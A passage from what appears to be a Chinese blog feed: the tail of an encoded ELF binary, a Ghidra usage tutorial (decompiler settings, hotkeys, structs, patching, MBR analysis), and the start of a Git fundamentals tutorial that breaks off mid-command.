class="line">AAcAAAABAAAACAAAAAAAAAAYAAAAAAAAAFkAAAADAAAAAgAAAAAAAACABEAAAAAAAIAEAAAAAAAA</span><br><span class="line">gAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAABhAAAA////bwIAAAAAAAAAAAVAAAAAAAAA</span><br><span class="line">BQAAAAAAABAAAAAAAAAABgAAAAAAAAACAAAAAAAAAAIAAAAAAAAAbgAAAP7//28CAAAAAAAAABAF</span><br><span class="line">QAAAAAAAEAUAAAAAAABAAAAAAAAAAAcAAAABAAAACAAAAAAAAAAAAAAAAAAAAH0AAAAEAAAAAgAA</span><br><span class="line">AAAAAABQBUAAAAAAAFAFAAAAAAAAMAAAAAAAAAAGAAAAAAAAAAgAAAAAAAAAGAAAAAAAAACHAAAA</span><br><span class="line">BAAAAEIAAAAAAAAAgAVAAAAAAACABQAAAAAAAHgAAAAAAAAABgAAABgAAAAIAAAAAAAAABgAAAAA</span><br><span class="line">AAAAkQAAAAEAAAAGAAAAAAAAAAAQQAAAAAAAABAAAAAAAAAbAAAAAAAAAAAAAAAAAAAABAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAIwAAAABAAAABgAAAAAAAAAgEEAAAAAAACAQAAAAAAAAYAAAAAAAAAAAAAAAAAAA</span><br><span class="line">ABAAAAAAAAAAEAAAAAAAAACXAAAAAQAAAAYAAAAAAAAAgBBAAAAAAACAEAAAAAAAAFAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAQAAAAAAAAABAAAAAAAAAAoAAAAAEAAAAGAAAAAAAAANAQQAAAAAAA0BAAAAAAAABl</span><br><span class="line">BQAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAKYAAAABAAAABgAAAAAAAAA4FkAAAAAAADgW</span><br><span class="line">AAAAAAAADQAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAACsAAAAAQAAAAIAAAAAAAAAACBA</span><br><span class="line">AAAAAAAAIAAAAAAAAIoAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAtAAAAAEAAAACAAAA</span><br><span class="line">AAAAAIwgQAAAAAAAjCAAAAAAAABsAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAMIAAAAB</span><br><span class="line">AAAAAgAAAAAAAAD4IEAAAAAAAPggAAAAAAAAoAEAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAA</span><br><span class="line">AADMAAAADgAAAAMAAAAAAAAAED5AAAAAAAAQLgAAAAAAAAgAAAAAAAAAAAAAAAAAAAAIAAAAAAAA</span><br><span class="line">AAgAAAAAAAAA2AAAAA8AAAADAAAAAAAAABg+QAAAAAAAGC4AAAAAAAAIAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">CAAAAAAAAAAIAAAAAAAAAOQAAAAGAAAAAwAAAAAAAAAgPkAAAAAAACAuAAAAAAAA0AEAAAAAAAAH</span><br><span class="line">AAAAAAAAAAgAAAAAAAAAEAAAAAAAAADtAAAAAQAAAAMAAAAAAAAA8D9AAAAAAADwLwAAAAAAABAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAIAAAAAAAAAAgAAAAAAAAA8gAAAAEAAAADAAAAAAAAAABAQAAAAAAAADAA</span><br><span class="line">AAAAAABAAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAPsAAAABAAAAAwAAAAAAAABAQEAA</span><br><span class="line">AAAAAEAwAAAAAAAASwAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAAABAQAACAAAAAMAAAAA</span><br><span class="line">AAAAi0BAAAAAAACLMAAAAAAAAAUAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAABgEAAAEA</span><br><span class="line">AAAwAAAAAAAAAAAAAAAAAAAAizAAAAAAAAArAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAABAAAAAAAA</span><br><span class="line">AAEAAAADAAAAAAAAAAAAAAAAAAAAAAAAALYwAAAAAAAADwEAAAAAAAAAAAAAAAAAAAEAAAAAAAAA</span><br><span class="line">AAAAAAAAAAA=</span><br></pre></td></tr></table></figure>
</details>

<h2 id="导入要分析的程序"><a href="#导入要分析的程序" class="headerlink" title="导入要分析的程序"></a>导入要分析的程序</h2><p>先通过 <code>File - New Project...</code> 根据提示创建一个项目，创建完成后可以直接将要分析的程序拖拽进来，选择好对应的程序格式(Ghidra会自动识别，识别不出来的时候再手动选择，比如在<a href="#%E5%88%86%E6%9E%90mbr%E7%A8%8B%E5%BA%8F">分析MBR程序时</a>), 直接双击要分析的程序即可进入代码浏览器。头一次打开会提示进行分析，提示一律默认即可。</p>
<img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/Untitled.gif" alt="SnapShot" style="zoom:50%;" />

<h2 id="设置修改"><a href="#设置修改" class="headerlink" title="设置修改"></a>设置修改</h2><p>可以先在 <code>Edit - Tool Options...</code> 中修改一下 <code>Decompiler</code> 的设置（默认的设置会不显示它认为不可达的代码段，导致在反编译一些程序时可能会找不着部分代码；另外有些函数方法前缀太长，通过设置可以简化一下显示）</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/Untitled.png" alt="SnapShot"></p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-2.png" alt="image-2.png"></p>
<h2 id="日常使用"><a href="#日常使用" class="headerlink" title="日常使用"></a>日常使用</h2><p>所有的功能窗口可以在 <code>Windows</code> 栏下选择打开</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-3.png" alt="image-3.png"></p>
<p>最常用的自然是 <code>Decompile</code> 窗口，不过也不能过分依赖 Ghidra 反编译产生的代码，反编译的代码可能是有问题的，需要再结合中间的汇编代码进行分析。</p>
<h3 id="返回上一级函数"><a href="#返回上一级函数" class="headerlink" title="返回上一级函数"></a>返回上一级函数</h3><ul>
<li>macOS 快捷键: Option + Shift + ←</li>
<li>Windows 快捷键: Alt + Shift + ←</li>
</ul>
<h3 id="指定数据类型"><a href="#指定数据类型" class="headerlink" title="指定数据类型"></a>指定数据类型</h3><ul>
<li>快捷键 T<ul>
<li>弹出类型修改窗口后可输入指定类型名称进行搜索 &#x2F; 或展开自行选择所需类型</li>
</ul>
</li>
</ul>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20231108154538865.png" alt="image-20231108154538865"></p>
<p>想让这种在 data 段的数据在伪代码界面能够直接显示字符串内容，选择数据类型为 TerminatedCString 即可 </p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/Untitled%207.png" alt="SnapShot"></p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/Untitled%208.png" alt="SnapShot"></p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/Untitled%209.png" alt="SnapShot"></p>
<p>如果内容是中文，这种情况：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/Untitled%2010.png" alt="SnapShot"></p>
<p>可以在这个默认设置里修改默认字符集为 UTF-8 或 GB2312，就能正常显示了：</p>
<img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/Untitled%2011.png" alt="SnapShot" style="zoom:50%;" />

<img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/Untitled%2012.png" alt="SnapShot" style="zoom:50%;" />

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/Untitled%2013.png" alt="SnapShot"></p>
<p>然后对于后续其他同样的字符串可以使用快捷键 Y 转换。</p>
<h3 id="查找字符串"><a href="#查找字符串" class="headerlink" title="查找字符串"></a>查找字符串</h3><p>在 <code>Defined Strings</code> 窗口可以直接查看搜索识别到的字符串数据：</p>
<img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-4.png" alt="image-4.png" style="zoom:50%;" />

<h3 id="查看函数调用图"><a href="#查看函数调用图" class="headerlink" title="查看函数调用图"></a>查看函数调用图</h3><p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/Untitled%201.png" alt="SnapShot"></p>
<img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-5.png" alt="image-5.png" style="zoom:50%;" />

<p>想知道如何才能进入某个函数，也可以通过函数调用树可以清晰的看出来：</p>
<img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/Untitled%202.png" alt="SnapShot" style="zoom:50%;" />

<h3 id="反向引用查询"><a href="#反向引用查询" class="headerlink" title="反向引用查询"></a>反向引用查询</h3><ul>
<li>光标选中需要查询的目标函数符号名 &#x2F; 地址<ul>
<li>macOS 下的快捷键: Command + Shift + F</li>
<li>Windows 下的快捷键: Ctrl + Shift + F</li>
</ul>
</li>
</ul>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20231108155214411.png" alt="image-20231108155214411"></p>
<h3 id="修改变量名"><a href="#修改变量名" class="headerlink" title="修改变量名"></a>修改变量名</h3><p>在变量上右键可以修改变量名（或者使用快捷键 L ）：</p>
<img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/Untitled%203.png" alt="SnapShot" style="zoom:50%;" />

<p>有些 <code>undefined</code> 类型的变量在反编译板块右键没有修改变量名称选项，需要在汇编板块进行修改：</p>
<img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/Untitled%204.png" alt="SnapShot" style="zoom:50%;" />

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/Untitled%205.png" alt="SnapShot"></p>
<h3 id="添加注释"><a href="#添加注释" class="headerlink" title="添加注释"></a>添加注释</h3><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/Untitled%206.png" alt="SnapShot" style="zoom:50%;" />

<h3 id="添加结构体"><a href="#添加结构体" class="headerlink" title="添加结构体"></a>添加结构体</h3><p>在 <code>Data Type Manager</code> 功能窗口中可以创建新的结构体：</p>
<img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/Untitled%2014.png" alt="SnapShot" style="zoom:50%;" />

<p>自定义编辑结构体中包含的数据类型：</p>
<img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/Untitled%2015.png" alt="SnapShot" style="zoom:50%;" />

<p>某全局变量配置结构体之前：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/Untitled%2016.png" alt="SnapShot"></p>
<p>指定自定义的结构体后：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/Untitled%2017.png" alt="SnapShot"></p>
<h3 id="Patching"><a href="#Patching" class="headerlink" title="Patching"></a>Patching</h3><p>在目标汇编代码处右键选择 Patch Instruction 可以进行指令修改：</p>
<ul>
<li>macOS 快捷键: Command + Shift + G</li>
<li>Windows 快捷键: Ctrl + Shift + G</li>
</ul>
<img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/Untitled%2018.png" alt="SnapShot" style="zoom:50%;" />

<p>结合 Clear Code Bytes 也可以任意修改成其他指令：</p>
<img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/Untitled%2019.png" alt="SnapShot" style="zoom:50%;" />

<p>导出程序: </p>
<ul>
<li><code>File - Export Program</code>，选择对应的格式（ELF&#x2F;PE）导出即可<ul>
<li>10.3 及以后版本不再存在 PE&#x2F;ELF 导出选项，改选 <code>Original File</code></li>
</ul>
</li>
</ul>
<h2 id="分析MBR程序"><a href="#分析MBR程序" class="headerlink" title="分析MBR程序"></a>分析MBR程序</h2><blockquote>
<p>配置方法参考： <a href="https://jarijaas.github.io/posts/disobey-2020/">https://jarijaas.github.io/posts/disobey-2020/</a></p>
</blockquote>
<p>选择语言时，选择 <code>x86 - Real Mode - 16 - little - default</code></p>
<img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/Untitled%2020.png" alt="SnapShot" style="zoom:50%;" />

<p>然后使用 Memory Map 移动代码块的起始地址为 <code>0x7c00</code> (MBR 程序的入口点)</p>
<img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/Untitled%2021.png" alt="SnapShot" style="zoom:50%;" />

<p>然后继续分析程序就好</p>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>仍在学习中。。。</p>
]]></content>
      <categories>
        <category>Tool</category>
      </categories>
      <tags>
        <tag>Tutorial</tag>
      </tags>
  </entry>
  <entry>
    <title>git 基础知识与使用</title>
    <url>/2022/09/20/Git/</url>
    <content><![CDATA[<h1 id="Git"><a href="#Git" class="headerlink" title="Git"></a>Git</h1><blockquote>
<p>本文内容基于 <a href="https://missing-semester-cn.github.io/2020/version-control/">The Missing Semester of Your CS Education - 版本控制(Git)</a> 改编</p>
</blockquote>
<details class="note default"><summary><p>Git 相关学习资料看这里</p>
</summary>
<ul>
<li><a href="https://missing-semester-cn.github.io/2020/version-control/">The Missing Semester of Your CS Education - 版本控制(Git)</a><ul>
<li><a href="https://www.bilibili.com/video/BV1x7411H7wa/">带中文字幕的搬运视频, 看Lecture6</a></li>
</ul>
</li>
<li><a href="https://git-scm.com/book/zh/v2/">Pro Git</a></li>
<li>扩展练习： <a href="https://gitimmersion.com/index.html">Git Immersion</a></li>
</ul>

</details>

<h2 id="一、理论知识"><a href="#一、理论知识" class="headerlink" title="一、理论知识"></a>一、理论知识</h2><div class="note primary"><p><strong>版本控制系统 (VCSs)</strong></p>
<ul>
<li>Version Control Systems</li>
<li>用于<strong>追踪源代码（或其他文件、文件夹）改动</strong>的工具</li>
<li>管理代码的<strong>修改历史</strong></li>
<li>让<strong>协作编码</strong>变得更方便</li>
<li>VCS<ul>
<li>通过一系列的快照将某个文件夹及其内容保存了起来</li>
<li>每个快照都包含了文件或文件夹的完整状态</li>
<li>同时它还维护了快照创建者的信息以及每个快照的相关信息</li>
</ul>
</li>
</ul>
</div>


<blockquote>
<p>关于版本控制： <a href="https://git-scm.com/book/zh/v2/%E8%B5%B7%E6%AD%A5-%E5%85%B3%E4%BA%8E%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6">https://git-scm.com/book/zh/v2/起步-关于版本控制</a></p>
</blockquote>
<div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/Pasted%20image%2020220920103725.png" alt="本地版本控制系统" style="height: auto"></div><div class="group-picture-column"><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/Pasted%20image%2020220920103812.png" alt="集中化版本控制系统" style="height: auto"></div><div class="group-picture-column"><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/Pasted%20image%2020220920103826.png" alt="分布式版本控制系统" style="height: auto"></div></div></div>


<h3 id="Git-1"><a href="#Git-1" class="headerlink" title="Git"></a>Git</h3><details class="note success"><summary><p><a href="https://git-scm.com/book/zh/v2/%E8%B5%B7%E6%AD%A5-Git-%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F">Git 是什么？</a></p>
</summary>
<p>直接记录快照，而非差异比较<br><a href="https://en.wikipedia.org/wiki/Git">Wikipedia</a> ：<strong>Git</strong> (&#x2F;ɡɪt&#x2F;) is free and open source software for <strong>distributed version control</strong></p>

</details>

<ul>
<li>很多时候只能死记硬背一些命令行，然后像使用魔法一样使用它们。<ul>
<li>一旦出现问题，就只能像这幅漫画里说的那样去处理了😅<ul>
<li>毕竟只知道硬背命令，不知道所处的情况，遇到报错最简单的处理方式莫过于保存现在的工作，然后删掉混乱的仓库，重新克隆仓库，再粘回去</li>
</ul>
</li>
</ul>
</li>
</ul>
<img src="https://imgs.xkcd.com/comics/git.png" style="zoom: 50%">


<h3 id="Git-的数据模型"><a href="#Git-的数据模型" class="headerlink" title="Git 的数据模型"></a>Git 的数据模型</h3><h4 id="快照"><a href="#快照" class="headerlink" title="快照"></a>快照</h4><ul>
<li>Git 将顶级目录中的文件和文件夹作为集合，并通过一系列快照来管理其历史记录。</li>
<li><strong>文件</strong>被称作<strong>Blob对象</strong>（数据对象），也就是一组数据。</li>
<li><strong>目录</strong>则被称之为 <strong>tree</strong>，它将名字与 Blob 对象或树对象进行映射（使得目录中可以包含其他目录）。</li>
<li>快照则是被追踪的最顶层的树。</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;root&gt; (tree)</span><br><span class="line">|</span><br><span class="line">+- foo (tree)</span><br><span class="line">|  |</span><br><span class="line">|  + bar.txt (blob, contents = &quot;hello world&quot;)</span><br><span class="line">|</span><br><span class="line">+- baz.txt (blob, contents = &quot;git is wonderful&quot;)</span><br></pre></td></tr></table></figure>

<p><strong>历史记录建模：关联快照</strong></p>
<ul>
<li>有向无环图</li>
<li>Git 中的每个快照都有一系列的“父辈”，也就是其之前的一系列快照。</li>
<li>注意，快照具有<strong>多个“父辈”</strong>而非一个，因为某个快照可能由多个父辈而来。<ul>
<li>例如，经过合并后的两条分支。</li>
</ul>
</li>
</ul>
<p>可视化展示一下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">o &lt;-- o &lt;-- o &lt;-- o</span><br><span class="line">            ^  </span><br><span class="line">             \</span><br><span class="line">              --- o &lt;-- o</span><br></pre></td></tr></table></figure>

<ul>
<li>o 表示一次提交（快照）</li>
<li>箭头指向当前提交的父辈</li>
<li>第三次提交之后，历史记录分岔成了两条独立的分支<ul>
<li>可能因为此时需要同时开发两个不同的特性，他们之间是相互独立的</li>
</ul>
</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">o &lt;-- o &lt;-- o &lt;-- o &lt;---- o</span><br><span class="line">            ^            /</span><br><span class="line">             \          v</span><br><span class="line">              --- o &lt;-- o</span><br></pre></td></tr></table></figure>

<ul>
<li>开发完成后，这些分支可能会被合并并创建一个新的提交，这个新的提交会同时包含这些特性。</li>
</ul>
<details class="note info"><summary><p>数据模型的伪代码表示</p>
</summary>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 文件就是一组数据</span></span><br><span class="line">type blob = <span class="built_in">array</span>&lt;byte&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 一个包含文件和目录的目录</span></span><br><span class="line">type tree = <span class="built_in">map</span>&lt;<span class="built_in">string</span>, tree | blob&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 每个提交都包含一个父辈，元数据和顶层树</span></span><br><span class="line">type commit = <span class="keyword">struct</span> &#123;</span><br><span class="line">    parent: <span class="built_in">array</span>&lt;commit&gt;</span><br><span class="line">    author: <span class="built_in">string</span></span><br><span class="line">    message: <span class="built_in">string</span></span><br><span class="line">    snapshot: tree</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</details>

<h4 id="对象和内存寻址"><a href="#对象和内存寻址" class="headerlink" title="对象和内存寻址"></a>对象和内存寻址</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Git 中的对象可以是 blob、tree、commit</span></span><br><span class="line">type object = blob | tree | commit</span><br><span class="line"></span><br><span class="line"><span class="comment">// Git 在储存数据时，所有的对象都会基于它们的 SHA-1 哈希 进行寻址</span></span><br><span class="line"><span class="comment">// 换句话说，当它们引用其他对象时，硬盘上保存的上这些对象的哈希值</span></span><br><span class="line">objects = <span class="built_in">map</span>&lt;<span class="built_in">string</span>, object&gt;</span><br><span class="line"></span><br><span class="line">def store(object):</span><br><span class="line">    id = sha1(object)</span><br><span class="line">    objects[id] = object</span><br><span class="line"></span><br><span class="line">def load(id):</span><br><span class="line">    <span class="keyword">return</span> objects[id]</span><br></pre></td></tr></table></figure>
<p>例如上面例子中的树：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">698281bc680d1995c5f4caaf3359721a5a58d48d 是顶层树的哈希值</span></span><br><span class="line">❯ git cat-file -p 698281bc680d1995c5f4caaf3359721a5a58d48d</span><br><span class="line">100644 blob 4448adbf7ecd394f42ae135bbeed9676e894af85	baz.txt</span><br><span class="line">040000 tree c68d233a33c5c06e0340e4c224f0afca87c8ce87	foo</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">可以通过哈希读取baz.txt文件的内容</span></span><br><span class="line">❯ git cat-file -p 4448adbf7ecd394f42ae135bbeed9676e894af85</span><br><span class="line">git is wonderful</span><br></pre></td></tr></table></figure>

<h4 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h4><ul>
<li>所有的快照可通过哈希值标记，但是40位的16进制字符串难以记忆</li>
<li>给这些哈希值赋予人类可读的名字，也就是<strong>引用</strong>（references）<ul>
<li>引用是指向提交的指针</li>
<li>引用可以被更新，指向新的提交</li>
<li>master 引用通常会指向<strong>主分支的最新一次提交</strong></li>
<li><strong>当前的位置</strong>有一个特殊的索引： “HEAD”</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">references = <span class="built_in">map</span>&lt;<span class="built_in">string</span>, <span class="built_in">string</span>&gt;</span><br><span class="line"></span><br><span class="line">def update_reference(name, id):</span><br><span class="line">    references[name] = id</span><br><span class="line"></span><br><span class="line">def read_reference(name):</span><br><span class="line">    <span class="keyword">return</span> references[name]</span><br><span class="line"></span><br><span class="line">def load_reference(name_or_id):</span><br><span class="line">    <span class="keyword">if</span> name_or_id in references:</span><br><span class="line">        <span class="keyword">return</span> load(references[name_or_id])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> load(name_or_id)</span><br></pre></td></tr></table></figure>

<h4 id="仓库"><a href="#仓库" class="headerlink" title="仓库"></a>仓库</h4><ul>
<li>粗略的Git仓库定义：对象 和 引用</li>
<li>在硬盘上，Git 仅存储对象和引用</li>
</ul>
<h3 id="版本库、工作区、暂存区"><a href="#版本库、工作区、暂存区" class="headerlink" title="版本库、工作区、暂存区"></a>版本库、工作区、暂存区</h3><p><a href="https://www.liaoxuefeng.com/wiki/896043488029600/897271968352576">版本库、工作区与暂存区</a></p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/Pasted%20image%2020220920114455.png" alt="Pasted image 20220920114455"></p>
<p>我们把文件往Git版本库里添加的时候，是分两步执行的：</p>
<ol>
<li>第一步是用 <code>git add</code> 把文件添加进去，实际上就是把文件修改添加到<strong>暂存区</strong>；</li>
<li>第二步是用 <code>git commit</code> 提交更改，实际上就是把<strong>暂存区</strong>的所有内容提交到当前分支。</li>
</ol>
<h3 id="协议"><a href="#协议" class="headerlink" title="协议"></a>协议</h3><p><a href="https://git-scm.com/book/zh/v2/%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E7%9A%84-Git-%E5%8D%8F%E8%AE%AE">服务器上的Git - 协议</a></p>
<ul>
<li>本地协议（Local protocol）: 其中的远程版本库就是同一主机上的另一个目录。<ul>
<li><code>git clone /srv/git/project.git</code></li>
</ul>
</li>
<li>HTTP 协议: <ul>
<li><code>git clone https://github.com/git/git.git</code></li>
</ul>
</li>
<li>SSH 协议: <ul>
<li><code>git clone ssh://[user@]server/project.git</code></li>
</ul>
</li>
<li>Git 协议: <ul>
<li><code>git clone git@github.com:git/git.git</code></li>
</ul>
</li>
</ul>
<details class="note success"><summary><p>📌 <code>Remove my password from list so hackers won&#39;t be able to hack me</code></p>
</summary>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/Pasted%20image%2020220920115625.png" alt="Pasted image 20220920115625"></p>
<p>查看讨论： <a href="https://github.com/danielmiessler/SecLists/pull/155">https://github.com/danielmiessler/SecLists/pull/155</a></p>

</details>

<h2 id="二、基本操作"><a href="#二、基本操作" class="headerlink" title="二、基本操作"></a>二、基本操作</h2><ul>
<li>下载： <a href="https://git-scm.com/">https://git-scm.com/</a></li>
<li>安装：<a href="https://git-scm.com/book/zh/v2/%E8%B5%B7%E6%AD%A5-%E5%AE%89%E8%A3%85-Git">官方安装帮助文档</a></li>
</ul>
<h3 id="基础命令"><a href="#基础命令" class="headerlink" title="基础命令"></a>基础命令</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git --version</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git <span class="built_in">help</span> &lt;<span class="built_in">command</span>&gt;</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git config --global user.name ex7l0it &amp;&amp; git config --global user.email abc@abc.com</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git config --global core.editor vim</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git config --global core.pager <span class="string">&#x27;&#x27;</span></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git init</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git add .</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git status</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git commit -m <span class="string">&quot;first commit&quot;</span></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git <span class="built_in">log</span> --all --graph --decorate --oneline</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git diff</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git restore baz.txt</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git reset --hard/--soft/--mixed HEAD^</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git branch dev</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git switch dev</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git merge dev</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git <span class="built_in">clone</span> &lt;url&gt;</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git remote add origin &lt;url&gt;</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git push origin master</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git pull</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git fetch</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git merge</span></span><br></pre></td></tr></table></figure>

<details class="note info"><summary><p><code>git config</code> 相关</p>
</summary>
<ul>
<li>通过 <code>git config --local</code> 进行的配置将保存在当前 git 仓库的 <code>.git/config</code> 文件中</li>
<li>通过 <code>git config --global</code> 进行的配置将保存在当前用户家目录的 <code>.gitconfig</code> 文件中</li>
</ul>

</details>


<h4 id="第一次提交"><a href="#第一次提交" class="headerlink" title="第一次提交"></a>第一次提交</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">mkdir git_learning</span><br><span class="line">cd git_learning</span><br><span class="line">git init  # 初始化git仓库</span><br><span class="line">ls -al</span><br><span class="line">mkdir foo</span><br><span class="line">echo &quot;hello world&quot; &gt; foo/bar.txt</span><br><span class="line">echo &quot;git is wonderful&quot; &gt; baz.txt</span><br><span class="line">echo &quot;# README\n&quot; &gt; README.md</span><br><span class="line">git status</span><br><span class="line">git add .   # 将当前目录下所有文件加入暂存区</span><br><span class="line">git status</span><br><span class="line">git commit -m &quot;first commit&quot;</span><br><span class="line">git status</span><br><span class="line">git log</span><br></pre></td></tr></table></figure>

<h4 id="创建一个分支"><a href="#创建一个分支" class="headerlink" title="创建一个分支"></a>创建一个分支</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git switch -c dev</span><br><span class="line">git branch</span><br><span class="line">echo &quot;#/usr/bin/python3\nprint(&#x27;Hello world&#x27;)&quot; &gt; hello.py</span><br><span class="line">echo &quot;add hello.py&quot; &gt;&gt; README.md</span><br><span class="line">git add hello.py</span><br><span class="line">git commit -m &quot;dev 0.1&quot;</span><br><span class="line">git status -s               # -s 以简短的形式输出</span><br><span class="line">git commit -am &quot;dev 0.1.1&quot;  # 自动把所有已经跟踪过的文件暂存起来一并提交</span><br><span class="line">git status</span><br></pre></td></tr></table></figure>

<details class="note success"><summary><p>📌 关于 <code>git checkout</code> 与 <code>git switch</code> 和 <code>git restore</code></p>
</summary>
<p><code>git checkout</code> 这个命令既被用来切换分支，又被用来恢复工作区文件，对用户的认知造成了较大的困惑。Git自2.23版本开始引入两个新的命令： <code>git switch</code> 和 <code>git restore</code>，用来替代 <code>git checkout</code></p>
<ul>
<li><code>git switch</code>: 负责分支管理<ul>
<li><code>git switch &lt;branch_name&gt;</code>     切换至指定分支</li>
<li><code>git switch -c &lt;branch_name&gt;</code>  创建新的分支并切换至该分支</li>
</ul>
</li>
<li><code>git restore</code>: 负责文件恢复</li>
</ul>

</details>


<h4 id="合并分支"><a href="#合并分支" class="headerlink" title="合并分支"></a>合并分支</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">正常合并不出错的情况:</span></span><br><span class="line">git switch master</span><br><span class="line">echo test &gt; foo/a.txt</span><br><span class="line">git add foo/a.txt</span><br><span class="line">git commit -m &quot;add a.txt&quot;</span><br><span class="line">git log --all --graph</span><br><span class="line">git merge dev</span><br><span class="line">git log --graph</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">合并分支时出现冲突的情况:</span></span><br><span class="line">echo &quot;name=input(&#x27;your name: &#x27;)\nprint(&#x27;hello, &#123;&#125;&#x27;.format(name))&quot; &gt; 